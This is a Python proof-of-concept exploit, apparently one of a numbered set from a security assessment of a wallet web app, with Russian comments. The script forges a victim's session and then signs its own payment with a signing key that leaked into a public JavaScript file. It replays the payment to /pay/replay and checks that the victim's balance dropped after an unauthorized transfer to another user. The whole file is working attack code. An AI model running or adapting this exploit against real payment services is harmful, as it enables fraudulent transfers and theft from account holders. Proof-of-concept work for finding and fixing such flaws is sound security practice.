# -*- coding: utf-8 -*-
"""V-12. Подделка платёжной подписи + переигровка платежа.

handlers_money.go, payReplay: принимает (op_id, amount_kop, recipient, sig) и
сверяет sig с signPayment(...), ключ которого (PAYMENT_KEY) известен и утёк в
/static/pay.js. Подписываем произвольный платёж сами. В связке с поддельной
сессией жертвы (V-01) это несанкционированный перевод со счёта жертвы.
"""
import re

from wallet_client import Client, parser, sign_payment, banner, ok, fail


def balance_kop(client):
    body = client.get("/")[2].decode("utf-8", "replace")
    m = re.search(r'class="value">(-?[\d\s ]+),(\d\d)\s*₽', body)
    if not m:
        return None
    sign = -1 if m.group(1).strip().startswith("-") else 1
    return sign * (int(re.sub(r"\D", "", m.group(1))) * 100 + int(m.group(2)))


def main():
    a = parser("Подделка подписи платежа").parse_args()
    victim = Client(a.base)
    victim.forge(2, "employee")  # жертва petrova
    before = balance_kop(victim)
    banner(f"баланс жертвы до: {before} коп")

    amount = 5000
    recipient = "1"  # перевод на ivanov
    sig = sign_payment(0, amount, recipient)  # подпись своим ключом
    st, _, body = victim.post_form("/pay/replay", {
        "op_id": "0", "amount_kop": str(amount), "recipient": recipient, "sig": sig})
    txt = body.decode("utf-8", "replace")
    if "Подпись не совпала" in txt or "sig" in txt.lower() and st not in (200, 302):
        fail("сервер отверг подпись")

    after = balance_kop(victim)
    banner(f"баланс жертвы после: {after} коп")
    if after is None or after >= before:
        fail("перевод не прошёл")
    ok("самостоятельно подписанный платёж принят — ключ подписи скомпрометирован")


if __name__ == "__main__":
    main()
